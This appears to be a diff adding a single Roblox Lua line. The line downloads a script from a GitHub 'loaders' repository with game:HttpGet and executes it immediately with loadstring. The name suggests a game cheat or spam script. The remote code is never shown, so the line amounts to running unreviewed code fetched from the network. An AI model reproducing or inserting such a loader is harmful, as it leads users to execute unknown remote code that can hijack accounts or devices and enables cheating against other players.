@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/a-long-flight-sandbox-spam6-ie3h5gumobc1sk.lua"))()
